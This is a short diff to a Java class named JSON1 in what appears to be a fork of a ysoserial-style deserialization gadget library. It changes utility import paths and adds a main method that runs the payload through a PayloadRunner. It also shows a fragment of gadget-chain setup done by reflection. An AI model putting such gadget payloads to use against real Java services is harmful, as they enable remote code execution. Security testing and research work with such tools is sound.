@@ -4,8 +4,9 @@ package A.R.ysogate.payloads.gadgets;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Gadgets;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.PayloadRunner;
+import A.R.ysogate.payloads.utils.Reflections;
 
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.InvocationTargetException;
@@ -103,6 +104,9 @@ public class JSON1 implements ObjectPayload<Object> {
 		Reflections.setFieldValue(t1, "dataMap", jo);
 		Reflections.setFieldValue(t2, "dataMap", jo);
 		return Gadgets.makeMap(t1, t2);
+	}
+	public static void main ( final String[] args ) throws Exception {
+		PayloadRunner.run(JSON1.class, args);
 	}
 
 }
